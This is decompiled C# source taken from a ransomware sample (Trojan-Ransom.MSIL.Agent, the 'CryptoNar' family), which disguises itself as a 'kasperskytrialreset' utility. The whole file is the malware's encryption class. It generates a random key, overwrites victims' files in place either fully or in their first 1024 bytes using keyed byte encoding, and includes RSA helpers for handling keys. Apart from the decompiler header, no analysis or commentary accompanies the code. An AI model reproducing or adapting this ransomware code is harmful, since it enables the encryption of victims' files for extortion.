// Decompiled with JetBrains decompiler
// Type: CryptoNar.CryptoClass
// Assembly: kasperskytrialreset, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 35F54376-B284-4294-89A4-F0FFEE9E54ED
// Assembly location: C:\Users\Administrateur\Downloads\toto\Trojan-Ransom.MSIL.Agent.gog-69ba1e841933539403aedc15b34736c76a0dd6cb4874d262f29bce1fa3493d1c.exe

using System;
using System.IO;
using System.Security.Cryptography;

namespace CryptoNar
{
  internal class CryptoClass
  {
    private readonly Random _rnd = new Random();
    private readonly bool _optimalAsymmetricEncryptionPadding = false;

    public string EncryptionKey { get; private set; }

    public CryptoClass() => this.EncryptionKey = this.GenerateRandomString(20);

    public CryptoClass(string encryptionKey) => this.EncryptionKey = encryptionKey;

    public void GenerateKeys(int keySize, out string publicKey, out string publicAndPrivateKey)
    {
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(keySize))
      {
        publicKey = cryptoServiceProvider.ToXmlString(false);
        publicAndPrivateKey = cryptoServiceProvider.ToXmlString(true);
      }
    }

    public byte[] RsaEncryption(byte[] data, int keySize, string publicKeyXml)
    {
      if (data == null || data.Length == 0)
        throw new ArgumentException("Data are empty", nameof (data));
      int maxDataLength = this.GetMaxDataLength(keySize);
      if (data.Length > maxDataLength)
        throw new ArgumentException(string.Format("Maximum data length is {0}", (object) maxDataLength), nameof (data));
      if (!this.IsKeySizeValid(keySize))
        throw new ArgumentException("Key size is not valid", nameof (keySize));
      if (string.IsNullOrEmpty(publicKeyXml))
        throw new ArgumentException("Key is null or empty", nameof (publicKeyXml));
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(keySize))
      {
        cryptoServiceProvider.FromXmlString(publicKeyXml);
        return cryptoServiceProvider.Encrypt(data, this._optimalAsymmetricEncryptionPadding);
      }
    }

    public byte[] RsaDecryption(byte[] data, int keySize, string publicAndPrivateKeyXml)
    {
      if (data == null || data.Length == 0)
        throw new ArgumentException("Data are empty", nameof (data));
      if (!this.IsKeySizeValid(keySize))
        throw new ArgumentException("Key size is not valid", nameof (keySize));
      if (string.IsNullOrEmpty(publicAndPrivateKeyXml))
        throw new ArgumentException("Key is null or empty", nameof (publicAndPrivateKeyXml));
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(keySize))
      {
        cryptoServiceProvider.FromXmlString(publicAndPrivateKeyXml);
        return cryptoServiceProvider.Decrypt(data, this._optimalAsymmetricEncryptionPadding);
      }
    }

    public void EncryptFileFully(string filePath)
    {
      Stream stream = (Stream) new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
      byte[] numArray = new byte[stream.Length];
      using (BinaryReader binaryReader = new BinaryReader(stream))
      {
        using (BinaryWriter binaryWriter = new BinaryWriter(stream))
        {
          binaryReader.BaseStream.Position = 0L;
          byte[] aobToEncode = binaryReader.ReadBytes((int) stream.Length);
          binaryWriter.BaseStream.Position = 0L;
          byte[] buffer = this.EncodeAob(aobToEncode, this.GetBytes(this.EncryptionKey));
          binaryWriter.Write(buffer);
        }
      }
      stream.Close();
      stream.Dispose();
    }

    public void DecryptFileFully(string filePath)
    {
      Stream stream = (Stream) new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
      byte[] numArray = new byte[stream.Length];
      using (BinaryReader binaryReader = new BinaryReader(stream))
      {
        using (BinaryWriter binaryWriter = new BinaryWriter(stream))
        {
          binaryReader.BaseStream.Position = 0L;
          byte[] aobToDecode = binaryReader.ReadBytes((int) stream.Length);
          binaryWriter.BaseStream.Position = 0L;
          byte[] buffer = this.DecodeAob(aobToDecode, this.GetBytes(this.EncryptionKey));
          binaryWriter.Write(buffer);
        }
      }
      stream.Close();
      stream.Dispose();
    }

    public void EncryptFilePartially(string filePath)
    {
      Stream stream = (Stream) new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
      byte[] numArray = new byte[1024];
      using (BinaryReader binaryReader = new BinaryReader(stream))
      {
        using (BinaryWriter binaryWriter = new BinaryWriter(stream))
        {
          binaryReader.BaseStream.Position = 0L;
          byte[] aobToEncode = binaryReader.ReadBytes(1024);
          binaryWriter.BaseStream.Position = 0L;
          byte[] buffer = this.EncodeAob(aobToEncode, this.GetBytes(this.EncryptionKey));
          binaryWriter.Write(buffer);
        }
      }
      stream.Close();
      stream.Dispose();
    }

    public void DecryptFilePartially(string filePath)
    {
      Stream stream = (Stream) new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
      byte[] numArray = new byte[1024];
      using (BinaryReader binaryReader = new BinaryReader(stream))
      {
        using (BinaryWriter binaryWriter = new BinaryWriter(stream))
        {
          binaryReader.BaseStream.Position = 0L;
          byte[] aobToDecode = binaryReader.ReadBytes(1024);
          binaryWriter.BaseStream.Position = 0L;
          byte[] buffer = this.DecodeAob(aobToDecode, this.GetBytes(this.EncryptionKey));
          binaryWriter.Write(buffer);
        }
      }
      stream.Close();
      stream.Dispose();
    }

    private byte[] EncodeAob(byte[] aobToEncode, byte[] passwordBytes)
    {
      byte[] numArray = new byte[aobToEncode.Length];
      int index1 = 0;
      for (int index2 = 0; index2 < aobToEncode.Length; ++index2)
      {
        numArray[index2] = (byte) ((uint) aobToEncode[index2] + (uint) passwordBytes[index1]);
        if (passwordBytes[index1 + 1] == (byte) 0)
          index1 = 0;
        else
          ++index1;
      }
      return numArray;
    }

    private byte[] DecodeAob(byte[] aobToDecode, byte[] passwordBytes)
    {
      byte[] numArray = new byte[aobToDecode.Length];
      int index1 = 0;
      for (int index2 = 0; index2 < aobToDecode.Length; ++index2)
      {
        numArray[index2] = (byte) ((uint) aobToDecode[index2] - (uint) passwordBytes[index1]);
        if (passwordBytes[index1 + 1] == (byte) 0)
          index1 = 0;
        else
          ++index1;
      }
      return numArray;
    }

    private string GenerateRandomString(int length)
    {
      string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      string randomString = "";
      for (int index = 0; index < length; ++index)
        randomString += str[this._rnd.Next(str.Length)].ToString();
      return randomString;
    }

    private int GetMaxDataLength(int keySize) => this._optimalAsymmetricEncryptionPadding ? (keySize - 384) / 8 + 7 : (keySize - 384) / 8 + 37;

    private bool IsKeySizeValid(int keySize) => keySize >= 384 && keySize <= 16384 && keySize % 8 == 0;

    private byte[] GetBytes(string str)
    {
      byte[] dst = new byte[str.Length * 2];
      Buffer.BlockCopy((Array) str.ToCharArray(), 0, (Array) dst, 0, dst.Length);
      return dst;
    }

    private string GetString(byte[] bytes)
    {
      char[] dst = new char[bytes.Length / 2];
      Buffer.BlockCopy((Array) bytes, 0, (Array) dst, 0, bytes.Length);
      return new string(dst);
    }
  }
}
